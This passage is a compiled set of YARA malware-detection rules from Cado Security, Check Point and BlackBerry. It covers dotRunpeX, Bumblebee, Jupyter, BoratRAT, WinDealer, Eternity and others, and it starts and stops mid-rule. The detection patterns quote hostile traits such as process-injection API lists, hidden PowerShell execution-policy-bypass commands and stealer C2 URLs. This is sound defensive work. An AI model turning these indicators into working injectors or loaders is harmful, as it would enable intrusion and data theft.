		$a = { 31 41 56 4E 4D 36 38 67 6A 36 50 47 50 46 63 4A 75 66 74 4B 41 54 61 34 57 4C 6E 7A 67 38 66 70 66 76 }
		$b = { 38 42 45 44 43 34 31 31 30 31 32 41 33 33 42 41 33 34 46 34 39 31 33 30 44 30 46 31 38 36 39 39 33 43 36 41 33 32 44 41 44 38 39 37 36 46 36 41 35 44 38 32 43 31 45 44 32 33 30 35 34 43 30 35 37 45 43 45 44 35 34 39 36 46 36 35 }
		$c = { 24 31 30 6B 20 76 69 61 20 62 69 74 63 6F 69 6E 20 77 61 6C 6C 65 74 }
		$d = { 74 6F 78 20 49 44 }

	condition:
		uint16( 0 ) == 0x5A4D and all of them
}
rule CADOSECURITY_Lambda_Malware : FILE
{
	meta:
		description = "Detects AWS Lambda Malware"
		author = "cdoman@cadosecurity.com"
		id = "cd867d39-7ff8-599a-bd65-e0f5581ac3f6"
		date = "2022-04-03"
		modified = "2022-07-06"
		reference = "https://www.cadosecurity.com/cado-discovers-denonia-the-first-malware-specifically-targeting-lambda/"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Cado Security/Lambda_Malware.yar#L1-L17"
		license_url = "N/A"
		hash = "739fe13697bc55870ceb35003c4ee01a335f9c1f6549acb6472c5c3078417eed"
		hash = "a31ae5b7968056d8d99b1b720a66a9a1aeee3637b97050d95d96ef3a265cbbca"
		logic_hash = "46567ceeb39a3b3379fc5ee876e1539b24e8192af8fe31b5df16fb2b3105f176"
		score = 75
		quality = 80
		tags = "FILE"
		license = "Apache License 2.0"

	strings:
		$a = "github.com/likexian/doh-go/provider/"
		$b = "Mozilla/5.0 (compatible; Ezooms/1.0; help@moz.com)"
		$c = "username:password pair for mining server"

	condition:
		filesize < 30000KB and all of them
}
/*
 * YARA Rule Set
 * Repository Name: Check Point
 * Repository: https://github.com/mikesxrs/Open-Source-YARA-rules
 * Retrieval Date: 2026-11-22
 * Git Commit: ec0056f767db98bf6d5fd63877ad51fb54d350e9
 * Number of Rules: 4
 * Skipped: 0 (age), 0 (quality), 0 (score), 0 (importance)
 *
 * 
 * LICENSE
 * 
 * NO LICENSE SET
 */
rule CHECK_POINT_Injector_ZZ_Dotrunpex : FILE
{
	meta:
		description = "Detects new version of dotRunpeX - configurable .NET injector"
		author = "Jiri Vinopal (jiriv)"
		id = "6cdbe54b-2e8d-5f7b-81ac-983236d1449f"
		date = "2022-10-30"
		modified = "2023-04-10"
		reference = "https://research.checkpoint.com/2023/dotrunpex-demystifying-new-virtualized-net-injector-used-in-the-wild/"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Checkpoint/injector_ZZ_dotRunpeX.yar#L1-L58"
		license_url = "N/A"
		hash = "373a86e36f7e808a1db263b4b49d2428df4a13686da7d77edba7a6dd63790232"
		hash = "41ea8f9a9f2a7aeb086dedf8e5855b0409f31e7793cbba615ca0498e47a72636"
		hash = "5e3588e8ddebd61c2bd6dab4b87f601bd6a4857b33eb281cb5059c29cfe62b80"
		hash = "8c451b84d9579b625a7821ad7ddcb87bdd665a9e6619eaecf6ab93cd190cf504"
		hash = "8fa81f6341b342afa40b7dc76dd6e0a1874583d12ea04acf839251cb5ca61591"
		hash = "cd4c821e329ec1f7bfe7ecd39a6020867348b722e8c84a05c7eb32f8d5a2f4db"
		hash = "fa8a67642514b69731c2ce6d9e980e2a9c9e409b3947f2c9909d81f6eac81452"
		hash = "eb2e2ac0f5f51d90fe90b63c3c385af155b2fee30bc3dc6309776b90c21320f5"
		logic_hash = "ca4336533f90598a6b6f594036e20595073e0e7cab5fcd186995c5c7f2be287e"
		score = 75
		quality = 83
		tags = "FILE"

	strings:
		$implmap1 = "VirtualAllocEx"
		$implmap2 = "CreateProcess"
		$implmap3 = "CreateRemoteThread"
		$implmap4 = "Wow64SetThreadContext"
		$implmap5 = "Wow64GetThreadContext"
		$implmap6 = "NtResumeThread"
		$implmap7 = "ZwUnmapViewOfSection"
		$implmap8 = "NtWriteVirtualMemory"
		$implmap9 = "MessageBox"
		$implmap10 = "Wow64DisableWow64FsRedirection"
		$implmap11 = "Wow64RevertWow64FsRedirection"
		$implmap12 = "CreateFile"
		$implmap13 = "RtlInitUnicodeString"
		$implmap14 = "NtLoadDriver"
		$implmap15 = "NtUnloadDriver"
		$implmap16 = "OpenProcessToken"
		$implmap17 = "LookupPrivilegeValue"
		$implmap18 = "AdjustTokenPrivileges"
		$implmap19 = "CloseHandle"
		$implmap20 = "NtQuerySystemInformation"
		$implmap21 = "DeviceIoControl"
		$implmap22 = "GetProcessHeap"
		$implmap23 = "HeapFree"
		$implmap24 = "HeapAlloc"
		$implmap25 = "GetProcAddress"
		$implmap26 = "CopyMemory"
		$modulerefKernel1 = "Kernel32"
		$modulerefKernel2 = "kernel32"
		$modulerefNtdll1 = "Ntdll"
		$modulerefNtdll2 = "ntdll"
		$modulerefAdvapi1 = "Advapi32"
		$modulerefAdvapi2 = "advapi32"
		$regPath = "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\TaskKill" wide
		$rsrcName = "BIDEN_HARRIS_PERFECT_ASSHOLE" wide
		$koiVM1 = "KoiVM"
		$koiVM2 = "#Koi"

	condition:
		uint16( 0 ) == 0x5a4d and uint16( uint32( 0x3c ) ) == 0x4550 and ( $regPath or $rsrcName or 1 of ( $koiVM* ) ) and 24 of ( $implmap* ) and 1 of ( $modulerefKernel* ) and 1 of ( $modulerefNtdll* ) and 1 of ( $modulerefAdvapi* )
}
rule CHECK_POINT_Apt_Nazar_Component_Guids
{
	meta:
		description = "Detect Nazar Components by COM Objects' GUID"
		author = "Itay Cohen"
		id = "1bdc0b54-4903-559d-9037-450470fc7ef7"
		date = "2020-04-27"
		modified = "2023-04-10"
		reference = "https://research.checkpoint.com/2020/nazar-spirits-of-the-past/"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Checkpoint/apt_nazar_component_guids.yar#L1-L32"
		license_url = "N/A"
		hash = "1110c3e34b6bbaadc5082fabbdd69f492f3b1480724b879a3df0035ff487fd6f"
		hash = "1afe00b54856628d760b711534779da16c69f542ddc1bb835816aa92ed556390"
		hash = "2caedd0b2ea45761332a530327f74ca5b1a71301270d1e2e670b7fa34b6f338e"
		hash = "2fe9b76496a9480273357b6d35c012809bfa3ae8976813a7f5f4959402e3fbb6"
		hash = "460eba344823766fe7c8f13b647b4d5d979ce4041dd5cb4a6d538783d96b2ef8"
		hash = "4d0ab3951df93589a874192569cac88f7107f595600e274f52e2b75f68593bca"
		hash = "75e4d73252c753cd8e177820eb261cd72fecd7360cc8ec3feeab7bd129c01ff6"
		hash = "8fb9a22b20a338d90c7ceb9424d079a61ca7ccb7f78ffb7d74d2f403ae9fbeec"
		hash = "967ac245e8429e3b725463a5c4c42fbdf98385ee6f25254e48b9492df21f2d0b"
		hash = "be624acab7dfe6282bbb32b41b10a98b6189ab3a8d9520e7447214a7e5c27728"
		hash = "d34a996826ea5a028f5b4713c797247913f036ca0063cc4c18d8b04736fa0b65"
		hash = "d9801b4da1dbc5264e83029abb93e800d3c9971c650ecc2df5f85bcc10c7bd61"
		hash = "eb705459c2b37fba5747c73ce4870497aa1d4de22c97aaea4af38cdc899b51d3"
		logic_hash = "9fb69a0ea7272f1b1cbb290ae81e08f7e2b2f6c5409bbca12d9b0b781cb4c267"
		score = 75
		quality = 85
		tags = ""

	strings:
		$guid1_godown = { 98 B3 E5 F6 DF E3 6B 49 A2 AD C2 0F EA 30 DB FE }
		$guid2_godown = { 31 4B CB DB B8 21 0F 4A BC 69 0C 3C E3 B6 6D 00 }
		$guid3_godown = { AF 94 4E B6 6B D5 B4 48 B1 78 AF 07 23 E7 2A B5 }
		$guid4_filesystem = { 79 27 AB 37 34 F2 9D 4D B3 FB 59 A3 FA CB 8D 60 }
		$guid6_filesystem = { 2D A1 2B 77 62 8A D3 4D B3 E8 92 DA 70 2E 6F 3D }
		$guid5_filesystem = { AB D3 13 CF 1C 6A E8 4A A3 74 DE D5 15 5D 6A 88 }

	condition:
		any of them
}
rule CHECK_POINT_Injector_ZZ_Dotrunpex_Oldnew : FILE
{
	meta:
		description = "Detects new and old version of dotRunpeX - configurable .NET injector"
		author = "Jiri Vinopal (jiriv)"
		id = "43e2d520-bfe4-5530-a5b4-508cfba9d06e"
		date = "2022-10-30"
		modified = "2023-04-10"
		reference = "https://research.checkpoint.com/2023/dotrunpex-demystifying-new-virtualized-net-injector-used-in-the-wild/"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Checkpoint/injector_ZZ_dotRunpeX_oldnew.yar#L1-L45"
		license_url = "N/A"
		hash = "373a86e36f7e808a1db263b4b49d2428df4a13686da7d77edba7a6dd63790232"
		hash = "41ea8f9a9f2a7aeb086dedf8e5855b0409f31e7793cbba615ca0498e47a72636"
		hash = "5e3588e8ddebd61c2bd6dab4b87f601bd6a4857b33eb281cb5059c29cfe62b80"
		hash = "8c451b84d9579b625a7821ad7ddcb87bdd665a9e6619eaecf6ab93cd190cf504"
		hash = "8fa81f6341b342afa40b7dc76dd6e0a1874583d12ea04acf839251cb5ca61591"
		hash = "cd4c821e329ec1f7bfe7ecd39a6020867348b722e8c84a05c7eb32f8d5a2f4db"
		hash = "fa8a67642514b69731c2ce6d9e980e2a9c9e409b3947f2c9909d81f6eac81452"
		hash = "eb2e2ac0f5f51d90fe90b63c3c385af155b2fee30bc3dc6309776b90c21320f5"
		hash = "1e7614f757d40a2f5e2f4bd5597d04878768a9c01aa5f9f23d6c87660f7f0fbc"
		hash = "317e6817bba0f54e1547dd9acf24ee17a4cda1b97328cc69dc1ec16e11c258fc"
		hash = "65cac67ed2a084beff373d6aba6f914b8cba0caceda254a857def1df12f5154b"
		hash = "68ae2ee5ed7e793c1a49cbf1b0dd7f5a3de9cb783b51b0953880994a79037326"
		hash = "81763d8e3b42d07d76b0a74eda4e759981971635d62072c8da91251fc849b91e"
		logic_hash = "c6ae0b4fb6cae16ae8d71e238f7753e0eadd23820507616fa2331375f4403052"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$implmap1 = "VirtualAllocEx"
		$implmap2 = "CreateProcess"
		$implmap3 = "CreateRemoteThread"
		$implmap4 = "Wow64SetThreadContext"
		$implmap5 = "Wow64GetThreadContext"
		$implmap6 = "RtlInitUnicodeString"
		$implmap7 = "NtLoadDriver"
		$implmap8 = "LoadLibrary"
		$implmap9 = "VirtualProtect"
		$implmap10 = "AdjustTokenPrivileges"
		$implmap11 = "GetProcAddress"
		$modulerefKernel1 = "Kernel32"
		$modulerefKernel2 = "kernel32"
		$modulerefNtdll1 = "Ntdll"
		$modulerefNtdll2 = "ntdll"
		$regPath = "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\TaskKill" wide
		$rsrcName = "BIDEN_HARRIS_PERFECT_ASSHOLE" wide
		$koiVM1 = "KoiVM"
		$koiVM2 = "#Koi"

	condition:
		uint16( 0 ) == 0x5a4d and uint16( uint32( 0x3c ) ) == 0x4550 and ( $regPath or $rsrcName or 1 of ( $koiVM* ) ) and 9 of ( $implmap* ) and 1 of ( $modulerefKernel* ) and 1 of ( $modulerefNtdll* )
}
rule CHECK_POINT_Malware_Bumblebee_Packed
{
	meta:
		description = "Detects the packer used by bumblebee, the rule is based on the code responsible for allocating memory for a critical structure in its logic."
		author = "Marc Salinas @ CheckPoint Research"
		id = "35f00c87-c26e-5189-b66d-15d5a1b1dd20"
		date = "2022-07-13"
		modified = "2023-04-10"
		reference = "https://research.checkpoint.com/2022/bumblebee-increasing-its-capacity-and-evolving-its-ttps/"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Checkpoint/malware_bumblebee_packed.yar#L1-L31"
		license_url = "N/A"
		logic_hash = "063209aad7ab8a0be46fd578a16b04afc086f930cbdb6c2f7b02824f704d7330"
		score = 75
		quality = 85
		tags = ""
		malware_family = "BumbleBee"
		dll_jul = "6bc2ab410376c1587717b2293f2f3ce47cb341f4c527a729da28ce00adaaa8db"
		dll_jun = "82aab01a3776e83695437f63dacda88a7e382af65af4af1306b5dbddbf34f9eb"
		dll_may = "a5bcb48c0d29fbe956236107b074e66ffc61900bc5abfb127087bb1f4928615c"
		iso_jul = "ca9da17b4b24bb5b24cc4274cc7040525092dffdaa5922f4a381e5e21ebf33aa"
		iso_jun = "13c573cad2740d61e676440657b09033a5bec1e96aa1f404eed62ba819858d78"
		iso_may = "b2c28cdc4468f65e6fe2f5ef3691fa682057ed51c4347ad6b9672a9e19b5565e"
		zip_jun = "7024ec02c9670d02462764dcf99b9a66b29907eae5462edb7ae974fe2efeebad"
		zip_may = "68ac44d1a9d77c25a97d2c443435459d757136f0d447bfe79027f7ef23a89fce"

	strings:
		$heapalloc = {  
            48 8? EC [1-6]           // sub     rsp, 80h 
            FF 15 ?? ?? 0? 00 [0-5]  // call    cs:GetProcessHeap 
            33 D2                    // xor     edx, edx        ; dwFlags 
            4? [2-5]                 // mov     rcx, rax        ; hHeap 
            4? ?? ??                 // mov     r8d, ebx        ; dwBytes 
            FF 15 ?? ?? 0? 00        // call    cs:HeapAlloc 
            [8 - 11]                 // (load params) 
            48 89 05 ?? ?? ?? 00     // mov     cs:HeapBufferPtr, rax 
            E8 ?? ?? ?? ??           // call    memset 
            4? 8B ?? ?? ?? ?? 00     // mov     r14, cs:HeapBufferPtr 
        }

	condition:
		$heapalloc
}
/*
 * YARA Rule Set
 * Repository Name: BlackBerry
 * Repository: https://github.com/mikesxrs/Open-Source-YARA-rules
 * Retrieval Date: 2026-11-22
 * Git Commit: ec0056f767db98bf6d5fd63877ad51fb54d350e9
 * Number of Rules: 21
 * Skipped: 0 (age), 2 (quality), 0 (score), 0 (importance)
 *
 * 
 * LICENSE
 * 
 * NO LICENSE SET
 */

rule BLACKBERRY_Mal_Infostealer_EXE_Jupyter_Cert_36Ff : FILE
{
	meta:
		description = "Detects Jupter executables by certificate OOO Sistema (36ff)"
		author = "BlackBerry Research & Intelligence Team"
		id = "5671b149-4eb6-5b13-92de-01b71a001802"
		date = "2021-10-14"
		modified = "2022-07-06"
		reference = "https://blogs.blackberry.com/en/2022/01/threat-thursday-jupyter-infostealer-is-a-master-of-disguise"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Blackberry/Mal_Infostealer_EXE_Jupyter_Cert_36ff.yar#L3-L18"
		license_url = "N/A"
		logic_hash = "8f543c592f23257bda8902229a9a8a735bb593254b279a1786fc85734cd56905"
		score = 75
		quality = 85
		tags = "FILE"
		license = "This Yara rule is provided under the Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team"

	condition:
		uint16( 0 ) == 0x5a4d and for any i in ( 0 .. pe.number_of_signatures ) : ( pe.signatures [ i ] . issuer contains "Certum Extended Validation Code Signing CA SHA2" and pe.signatures [ i ] . serial == "36:ff:67:4e:b3:05:e9:9c:35:56:5f:a3:01:d5:c4:b0" )
}

rule BLACKBERRY_Mal_Infostealer_Win32_Jupyter_Main_Module
{
	meta:
		description = "Detects Jupter main module"
		author = "BlackBerry Threat Research Team"
		id = "b6c51dcc-bdf4-5960-b407-70379b948dc1"
		date = "2021-11-23"
		modified = "2022-07-06"
		reference = "https://blogs.blackberry.com/en/2022/01/threat-thursday-jupyter-infostealer-is-a-master-of-disguise"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Blackberry/Mal_Infostealer_Win32_Jupyter_Main_Module.yar#L3-L42"
		license_url = "N/A"
		logic_hash = "bf14defaa9b0c514ddbdd4ed09b69a670d432dd30a3bbe4895ad7f9a796c1897"
		score = 75
		quality = 83
		tags = ""
		license = "This Yara rule is provided under the Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team"

	strings:
		$g1 = { 68 00 74 00 74 00 70 00 3A 00 2F 00 2F 00 }
		$g2 = { 5C 00 41 00 50 00 50 00 44 00 41 00 54 00 41 00 5C 00 52 00 4F 00 41 00 4D 00 49 00 4E 00 47 }
		$g3 = { 63 00 68 00 61 00 6E 00 67 00 65 00 5F 00 73 00 74 00 61 00 74 00 75 00 73 }
		$g4 = { 50 00 4F 00 53 00 54 }
		$g5 = { 69 00 73 00 5F 00 73 00 75 00 63 00 63 00 65 00 73 00 73 }
		$g6 = { 75 00 73 00 65 00 72 00 70 00 72 00 6F 00 66 00 69 00 6C 00 65 }
		$g7 = { 44 00 45 00 53 00 4B 00 54 00 4F 00 50 00 2D }
		$g8 = { 4C 00 41 00 50 00 54 00 4F 00 50 00 2D }
		$g9 = { 78 00 38 00 36}
		$g10 = { 78 00 36 00 34 }
		$g11 = { 41 00 64 00 6D 00 69 00 6E }
		$g12 = { 56 00 69 00 73 00 74 00 61 }
		$g13 = { 64 00 6E 00 73 }
		$g14 = { 64 00 7A 00 6B 00 61 00 62 72 }
		$g15 = { 78 00 7A 00 6B 00 61 00 62 00 73 00 72 }
		$g16 = { 64 00 7A 00 6B 00 61 00 62 00 73 00 72 }
		$h1 = { 4F 00 43 00 2D }
		$h2 = { 4E 00 56 00 2D }
		$h3 = { 53 00 50 00 2D }
		$h4 = { 49 00 4E 00 2D }
		$i = "System.Net"

	condition:
		10 of ( $g* ) and 1 of ( $h* ) and ( pe.imports ( "mscoree.dll" , "_CorDllMain" ) or $i )
}
rule BLACKBERRY_Boratrat : FILE
{
	meta:
		description = "Detects BoratRAT.exe"
		author = "BlackBerry Threat Research Team"
		id = "d3c73c3b-885a-5fc2-a1bd-a05cadf1512f"
		date = "2022-04-13"
		modified = "2022-07-07"
		reference = "https://blogs.blackberry.com/en/2022/04/threat-thursday-boratrat"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Blackberry/BoratRAT.yar#L1-L41"
		license_url = "N/A"
		logic_hash = "3141300495288a96b48cfea491683042d172143295135ff82c058200c8d5108d"
		score = 75
		quality = 85
		tags = "FILE"
		license = "This Yara rule is provided under the Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team"

	strings:
		$s1 = "enigma1"
		$s2 = "enigma2"
		$s3 = "Server.Forms.FormFileManager.resources"
		$s4 = "Server.Forms.FormFileSearcher.resources"
		$s5 = "Server.Forms.FormKeylogger.resources"
		$s6 = "Server.Forms.FormNetstat.resources"
		$s7 = "Server.Forms.FormFun.resources"
		$s8 = "Server.Forms.FormWebcam.resources"
		$s9 = "BoratRat"
		$s10 = "Keylogger.exe"

	condition:
		uint16( 0 ) == 0x5a4d and all of them
}
rule BLACKBERRY_Windealer_Executable : FILE
{
	meta:
		description = "Detects WinDealer Executable"
		author = "BlackBerry Threat Research Team"
		id = "68fe2b61-5c2d-5434-a9c5-dae25ccd40a0"
		date = "2022-06-14"
		modified = "2022-07-07"
		reference = "https://blogs.blackberry.com/en/2022/06/threat-thursday-china-based-apt-plays-auto-updater-card-to-deliver-windealer-malwareZ"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Blackberry/Windealer_executable.yar#L1-L23"
		license_url = "N/A"
		logic_hash = "296e89ca89d063d165b6abab6a1e1e0b641cbbe7ff0ea60125c6beada457a95b"
		score = 75
		quality = 85
		tags = "FILE"
		license = "This Yara rule is provided under the Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team"

	strings:
		$s1 = "28e4-20a6acec"
		$s2 = "5a7e-42ccdb67"
		$s3 = "632c-0ef22957"
		$s4 = "63ae-a20cf808"
		$s5 = "65ce-731bffbb"
		$a1 = "remoteip"
		$a2 = "sessionid"
		$a3 = "remotedomain"
		$a4 = "remark"

	condition:
		uint16( 0 ) == 0x5a4d and 2 of ( $s* ) and 1 of ( $a* )
}

rule BLACKBERRY_Eternityworm : FILE
{
	meta:
		description = "Detects Eternity Worm"
		author = "BlackBerry Threat Research Team"
		id = "46860918-2c6e-528e-807c-ef6cf6c4f89b"
		date = "2022-05-22"
		modified = "2022-07-07"
		reference = "https://blogs.blackberry.com/en/2022/06/threat-spotlight-eternity-project-maas-goes-on-and-on"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Blackberry/EternityWorm.yar#L4-L31"
		license_url = "N/A"
		logic_hash = "6d944eddc1cc5acbeab1a8c85f16380b22467a069f91e7e8dd0b682d98e71976"
		score = 75
		quality = 85
		tags = "FILE"
		license = "This Yara rule is provided under the Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team"

	strings:
		$s1 = "Eternity 2022" wide
		$s2 = "Eternity" wide
		$s3 = "Anal Worm" wide
		$s4 = "Made in Heaven" wide
		$s5 = "Van Darkholme" wide
		$s6 = "EternityWorm.exe" wide

	condition:
		( uint16( 0 ) == 0x5a4d and pe.imphash ( ) == "f34d5f2d4577ed6d9ceec516c1f5a744" and all of ( $s* ) )
}
rule BLACKBERRY_Boratratkeylogger : FILE
{
	meta:
		description = "Detects BoratRAT Keylogger"
		author = "BlackBerry Threat Research Team"
		id = "8bcec652-a76b-5bfc-bf2c-bb8ce6a88ed5"
		date = "2022-04-13"
		modified = "2022-07-07"
		reference = "https://blogs.blackberry.com/en/2022/04/threat-thursday-boratrat"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Blackberry/BoratRATKeylogger.yar#L1-L39"
		license_url = "N/A"
		logic_hash = "ea3f39b675f02274b19b5732d065a0fcb05a4fe150f10a452a844af71b69aed2"
		score = 75
		quality = 85
		tags = "FILE"
		license = "This Yara rule is provided under the Apache License 2.0   (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team"

	strings:
		$s1 = "Sa8XOfH1BudXLog.txt" wide
		$s2 = "[CAPSLOCK: ON]" wide
		$s3 = "[CAPSLOCK: OFF]" wide
		$s4 = "[SPACE]" wide
		$s5 = "[ENTER]" wide
		$sp = { 43 3A 5C 55 73 65 72 73 5C 41 64 6D 69 6E 69 73 74 72 61 74 6F 72 5C

                    44 6F 77 6E 6C 6F 61 64 73 5C 53 61 6E 74 61 52 61 74 2D 6D 61 69 6E 

                    5C 42 69 6E 61 72 69 65 73 5C 52 65 6C 65 61 73 65 5C 50 6C 75 67 69 

                    6E 73 5C 4B 65 79 6C 6F 67 67 65 72 2E 70 64 62 }

	condition:
		uint16( 0 ) == 0x5a4d and all of them
}

rule BLACKBERRY_Eternitystealer : FILE
{
	meta:
		description = "Detects Eternity Stealer"
		author = "BlackBerry Threat Research Team"
		id = "8bccc143-c250-5d52-85cb-b315dc6fb679"
		date = "2022-05-22"
		modified = "2022-07-07"
		reference = "https://blogs.blackberry.com/en/2022/06/threat-spotlight-eternity-project-maas-goes-on-and-on"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Blackberry/EternityStealer.yar#L4-L32"
		license_url = "N/A"
		logic_hash = "466030b30c4436c3e3896ca3385ae829696e7f351bba81bc3c0efbc62b86645f"
		score = 75
		quality = 85
		tags = "FILE"
		license = "This Yara rule is provided under the Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team"

	strings:
		$s1 = "Corrupting Growtopia.." wide
		$s2 = "growtopia1.com" wide
		$s3 = "Deleting previous file from startup and copying new one." wide
		$s4 = "Debug mode, dont share this stealer anywhere." wide
		$s5 = "Sending info to Eternity.." wide
		$s6 = "Taking and uploading screenshot.." wide
		$s7 = "dcd.exe" wide
		$s8 = "https://eterprx.net" wide
		$s9 = "https://eternitypr.net" wide

	condition:
		( uint16( 0 ) == 0x5a4d and pe.imphash ( ) == "f34d5f2d4577ed6d9ceec516c1f5a744" and all of ( $s* ) )
}
rule BLACKBERRY_Windealer_Library : FILE
{
	meta:
		description = "Detects WinDealer Loaded DLL"
		author = "BlackBerry Threat Research Team"
		id = "d7fbf21b-9144-532a-ad5d-29543f0ffc33"
		date = "2022-06-14"
		modified = "2022-07-07"
		reference = "https://blogs.blackberry.com/en/2022/06/threat-thursday-china-based-apt-plays-auto-updater-card-to-deliver-windealer-malwareZ"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Blackberry/Windealer_Library.yar#L1-L26"
		license_url = "N/A"
		logic_hash = "35151a8c0486ceaddb5020cb81f644bba4b01d5f8e4726786abc65ae92ca9c3e"
		score = 75
		quality = 85
		tags = "FILE"
		license = "This Yara rule is provided under the Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team"

	strings:
		$s1 = "C:\\Users\\Public\\Documents\\Tencent\\QQ\\UserDataInfo.ini"
		$s2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"
		$s3 = "SOFTWARE\\SogouInput\\red"
		$s4 = "SOFTWARE\\SogouDesktopBar"
		$s5 = "MozillaDll.dll"
		$s6 = "Tencent Files"
		$s7 = "wangwang"
		$s8 = "WeChat Files"
		$s9 = "MyDocument"
		$s10 = "Skype"
		$e1 = "AutoGetSystemInfo"
		$e2 = "GetConfigInfo"
		$e3 = "partInitOpt"

	condition:
		uint16( 0 ) == 0x5a4d and all of them
}
rule BLACKBERRY_Mal_Infostealer_MSI_EXE_Jupyter_Certificate : FILE
{
	meta:
		description = "Detects Jupter by certificate"
		author = "BlackBerry Threat Research Team"
		id = "837fdc85-d5ac-560b-bc49-6e34eb216e93"
		date = "2021-11-04"
		modified = "2022-07-06"
		reference = "https://blogs.blackberry.com/en/2022/01/threat-thursday-jupyter-infostealer-is-a-master-of-disguise"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Blackberry/Mal_Infostealer_MSI_EXE_Jupyter_Certificate.yar#L1-L43"
		license_url = "N/A"
		logic_hash = "5524f227e4c0090b923d7966223806dd384458178083b752ebd9e0981b3fba52"
		score = 75
		quality = 83
		tags = "FILE"
		license = "This Yara rule is provided under the Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team"

	strings:
		$msi = { D0 CF 11 E0 A1 B1 1A E1 }
		$a1 = "EMCO MSI Package Builder"
		$b1 = "powershell-ExecutionPolicy bypass -command \"iex([\\[]IO.File[\\]]::ReadAllText('[CurrentUserProfileFolder]" nocase
		$b2 = "powershell-ep bypass -file \"[AppDataFolder]" nocase
		$b3 = /powershell-ep bypass -windowstyle hidden -command \"\$xp=\'\[AppDataFolder\].{0,256}\.{0,256}\'/ nocase
		$b4 = /powershell-ep bypass -windowstyle hidden -command \"\$p=\'\[AppDataFolder\].{0,256}\.{0,256}\'/ nocase
		$b5 = /powershell-ExecutionPolicy bypass -command \"iex\(\[\\\[\]IO.File\[\\\]\]::ReadAllText\(\'\[CurrentUserProfileFolder\].{1,256}\..{1,256}\'\)\)/ nocase
		$c1 = "OOO ENDI"
		$c2 = "OOO MVS"
		$c3 = "OOO LEVELAP"
		$c4 = "Soto Manufacturing SRL"
		$c5 = "Decapolis Consulting Inc."
		$f1 = "SSL.com EV Root Certification Authority RSA R2"
		$f2 = "SSL.com EV Code Signing Intermediate CA RSA R3"
		$f3 = "DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1"
		$f4 = "DigiCert Trusted Root G40"

	condition:
		($msi at 0 or uint16( 0 ) == 0x5a4d ) and all of ( $a* ) and 1 of ( $b* ) and 1 of ( $c* ) and 2 of ( $f* )
}
rule BLACKBERRY_Eternityransom : FILE
{
	meta:
		description = "Detects Eternity Ransomware"
		author = "BlackBerry Threat Research Team"
		id = "2a00bca6-2245-5330-9ad7-522f7bab42f4"
		date = "2022-05-22"
		modified = "2022-07-07"
		reference = "https://blogs.blackberry.com/en/2022/06/threat-spotlight-eternity-project-maas-goes-on-and-on"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Blackberry/EternityRansom.yar#L4-L28"
		license_url = "N/A"
		logic_hash = "9c4eabc8441b0bb80e582f4227f85b3e000e3fc6b1da237d9ce55df9716fb571"
		score = 75
		quality = 85
		tags = "FILE"
		license = "This Yara rule is provided under the Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team"

	strings:
		$s1 = "The harddisks of your computer have been encrypted with an Military grade encryption algorithm."
		$s2 = "by Eternity group"
		$s3 = "Eternity"
		$s4 = "decryption_password"
		$s5 = "Povlsomware"

